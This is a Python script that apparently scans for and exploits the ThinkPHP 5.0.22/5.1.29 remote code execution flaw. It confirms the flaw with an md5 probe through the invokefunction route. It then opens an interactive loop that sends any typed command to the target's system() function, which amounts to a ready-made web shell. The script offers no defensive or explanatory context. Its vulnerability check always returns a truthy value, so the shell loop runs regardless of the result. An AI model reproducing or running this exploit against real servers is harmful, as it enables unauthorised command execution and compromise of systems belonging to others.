import requests
import re
import urllib

def thinkphp5022_5129_rce(url):
    relsult = {
        'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        payload = urllib.parse.urljoin(url, r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
        response = requests.get(payload, timeout=3, verify=False)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['exp'] = True
        return relsult
    except:
        return relsult

# getshell
def exp():
    url = input('输入目标URL:')
    basic_payload = url + r'''/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='''
    if thinkphp5022_5129_rce(url):
        print('[+] 存在 Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability')
        while True:
            cmd_shell = input('[+] 执行命令:')
            payload = basic_payload + cmd_shell
            response = requests.get(payload, verify=False)
            print(response.text)
            output = re.search(r'<body>(.*)</body>', response.text)
            print(output)

if __name__ == '__main__':
    exp()